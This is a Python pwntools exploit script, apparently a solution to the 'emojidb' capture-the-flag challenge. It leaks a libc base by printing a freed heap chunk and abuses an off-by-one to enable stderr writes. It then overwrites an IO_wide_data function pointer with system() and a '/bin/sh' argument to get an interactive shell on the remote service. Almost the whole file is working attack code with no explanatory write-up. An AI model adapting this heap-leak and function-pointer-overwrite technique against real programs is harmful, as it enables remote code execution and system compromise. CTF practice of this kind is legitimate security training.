from pwn import *
import os
from sys import argv, exit

PRINT_FLAGS_CMD 		= u'\U0001F6A9'
EXIT_CMD 				= u'\U0001F6D1'
PRINT_EMOJI_CMD 		= u'\U0001F4D6'
ADD_EMOJI_CMD 			= u'\U0001F195'
DELETE_EMOJI_CMD 		= u'\U0001F193'
END_MSG					= b"\xe2\x9d\x93"
REMOTE_ADDED_BYTES		= b'\x86\x86\x91\x93\x93\x93\x95\x96\x98\x9b\x9d\x9f\x9f\x9f\x9f\x9f\xb1\xe2\xf0\xf0\xf0\xf0\xf0'

main_arena 				= 0x3ebc40
IO_wide_data_offset 	= 0x3eb9e8

# calling mbstowcs/wcstombs using ctypes causes annoying segfaults. So I compiled outside binaries that
# simply calling those. Ugly, but nevermind
def convert_utf_uni(utf):
	p = process(["./bin/mbstowcs"])
	p.send(utf)
	out = p.recv()
	p.close()

	return u64(out)

def convert_uni_utf(uni):
	p = process(["./bin/wcstombs"])
	p.send(uni)
	out = p.recv().rstrip(b'\x00')
	p.close()

	return out

def convert_ptr_to_utf(ptr):
	return convert_uni_utf(p64(ptr)[:4]) + convert_uni_utf(p64(ptr)[4:])

def print_emoji(s, idx):
    s.sendlineafter(END_MSG, PRINT_EMOJI_CMD.encode('utf-8'))
    s.recv(9)
    s.sendline(str(idx))
    return s.recvline()

def add_emoji(s, size, data):
    s.sendafter(END_MSG, ADD_EMOJI_CMD.encode('utf-8'))
    s.recv(9)
    s.send(str(size))
    s.sendline(data)
    s.recvline()

def delete_emoji(s, idx):
    s.sendlineafter(END_MSG, DELETE_EMOJI_CMD.encode('utf-8'))
    s.recv(9)
    s.sendline(str(idx))
    s.recvline()
    s.recv(4*6)

def get_flags_emojies(s):
	s.sendlineafter(END_MSG, PRINT_FLAGS_CMD.encode('utf-8'))

def leak_libc(s):
	for i in range(3):
		print("[*] send ADD_EMOJI_CMD: %c (0x400)" % chr(0x41+i))
		add_emoji(s, 0x400, chr(0x41+i))
		
	print("[*] send DELETE_EMOJI_CMD(2) -- create FD/BK pointers")
	delete_emoji(s, 2)

	print("[*] send PRINT_EMOJI_CMD(2), leak libc pointers")
	ret = print_emoji(s, 2)

	if type(s) is remote:
		ret = ret.strip(REMOTE_ADDED_BYTES)
	ret = ret[:len(ret)//2]
	
	leaked_ptr = convert_utf_uni(ret)

	print("[*] leaked ptr == 0x%x " % leaked_ptr)
	libc_base = leaked_ptr - main_arena - 0x60
	if libc_base < 0x7f0000000000:
		print("[-] got 0x%x, fail to leak libc" % libc_base)
		return 0

	return libc_base

def get_conn():
	if len(argv) > 1 and argv[1] == "remote":
		return remote('emojidb.pwni.ng', 9876)

	return process("./run.sh")

if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
	
	libc_base = 0
	while libc_base == 0:
		s = get_conn()
		raw_input("[*] start pasten, attach gdb")
		libc_base = leak_libc(s)

	print("[*] break libc! libc == 0x%x" % libc_base)

	IO_wide_data = libc_base + IO_wide_data_offset
	system = libc_base + libc.symbols['system']
	
	print("[*] IO_wide_data == 0x%x" % IO_wide_data)
	print("[*] system == 0x%x" % system)

	print("[*] remove the other emojies")
	delete_emoji(s, 1)
	delete_emoji(s, 3)

	print("[*] fill emoji_arr, using add_emoji() off-by-one to corrupt is_write_to_stderr_enabled in main()")
	for i in range(5):
		add_emoji(s, 0x400, chr(0x41+i))

	print("[*] now every unsupported cmd byte is written to stderr")
	print("[*] FINALLY, trigger corruption!")
	print("[*] corrupt func ptr with system(), set /bin/sh str in IO_wide_data_1")

	corrupt_data = b'\x00'*12
	for i in range(10):
		corrupt_data += convert_ptr_to_utf(IO_wide_data)
	corrupt_data += convert_uni_utf(b'/bin') 				# location where rdi points
	corrupt_data += convert_uni_utf(b'/sh\x00')
	corrupt_data += convert_uni_utf(p64(system)[:4])		# corrupt func ptr
	corrupt_data += b'\x00'*9 +  b'ILoveIDA:)'

	s.sendlineafter(END_MSG, corrupt_data)

	s.interactive()
